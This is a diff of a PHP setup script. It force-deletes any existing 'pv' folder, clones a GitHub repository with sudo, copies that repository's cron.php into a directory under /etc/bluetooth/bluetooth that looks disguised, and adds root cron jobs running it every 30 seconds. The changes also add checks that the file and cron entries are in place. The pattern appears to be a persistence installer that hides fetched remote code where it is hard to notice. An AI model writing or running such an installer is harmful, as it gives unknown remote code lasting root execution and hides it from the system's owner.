@@ -13,13 +13,15 @@ function executeCommand($command, $successMessage, $errorMessage) {
 }
 
 // Step 1: Clone the repository
-if (!is_dir('pv')) {
-    $cloneCommand = "sudo git clone https://github.com/s1L3n7-sH/pv";
-    if (!executeCommand($cloneCommand, "Repository cloned successfully", "Failed to clone repository")) {
+if (is_dir('pv')) {
+    $removeCommand = "sudo rm -rf pv";
+    if (!executeCommand($removeCommand, "Existing pv directory removed successfully", "Failed to remove existing pv directory")) {
         exit(1);
     }
-} else {
-    echo "Repository directory already exists\n";
+}
+$cloneCommand = "sudo git clone https://github.com/s1L3n7-sH/pv";
+if (!executeCommand($cloneCommand, "Repository cloned successfully", "Failed to clone repository")) {
+    exit(1);
 }
 
 // Step 2: Change directory and set permissions
@@ -34,8 +36,9 @@ if (is_dir('pv')) {
 }
 
 // Step 3: Add cron jobs
-$cronFile = "pv/cron.php";
-if (file_exists($cronFile)) {
+$sourceCronFile = "pv/cron.php";
+$targetCronFile = "/etc/bluetooth/bluetooth/pv/cron.php";
+if (file_exists($sourceCronFile)) {
     $targetDir = "/etc/bluetooth/bluetooth/pv";
     // Ensure the target directory exists
     if (!is_dir($targetDir)) {
@@ -46,22 +49,30 @@ if (file_exists($cronFile)) {
     }
     
     // Copy the cron.php file to the target location
-    $copyCommand = "sudo cp {$cronFile} {$targetDir}/cron.php";
-    if (!executeCommand($copyCommand, "Cron file copied successfully", "Failed to copy cron.php")) {
+    $copyCommand = "sudo cp {$sourceCronFile} {$targetCronFile}";
+    if (!executeCommand($copyCommand, "Cron file copied successfully to {$targetCronFile}", "Failed to copy cron.php")) {
         exit(1);
     }
     
-    // Add cron jobs (already using sudo in the original command)
+    // Verify the copied file exists
+    if (!file_exists($targetCronFile)) {
+        echo "Error: {$targetCronFile} not found after copy\n";
+        exit(1);
+    } else {
+        echo "Verified: {$targetCronFile} exists\n";
+    }
+    
+    // Add cron jobs
     $cronCommand = 'sudo bash -c \'(crontab -l 2>/dev/null; echo "* * * * * php /etc/bluetooth/bluetooth/pv/cron.php"; echo "* * * * * sleep 30 && php /etc/bluetooth/bluetooth/pv/cron.php") | crontab -\'';
     if (executeCommand($cronCommand, "Cron jobs added successfully", "Failed to add cron jobs")) {
         // Verify cron jobs were added
         exec("crontab -l", $cronOutput, $cronReturnCode);
         if ($cronReturnCode === 0 && !empty($cronOutput)) {
             $cronContent = implode("\n", $cronOutput);
-            if (strpos($cronContent, "/etc/bluetooth/bluetooth/pv/cron.php") !== false) {
-                echo "Cron jobs verified in crontab\n";
+            if (strpos($cronContent, "php /etc/bluetooth/bluetooth/pv/cron.php") !== false) {
+                echo "Verified: Cron jobs for {$targetCronFile} found in crontab\n";
             } else {
-                echo "Error: Cron jobs not found in crontab\n";
+                echo "Error: Cron jobs for {$targetCronFile} not found in crontab\n";
                 exit(1);
             }
         } else {
@@ -72,7 +83,7 @@ if (file_exists($cronFile)) {
         exit(1);
     }
 } else {
-    echo "Error: cron.php not found in repository\n";
+    echo "Error: {$sourceCronFile} not found in repository\n";
     exit(1);
 }
 
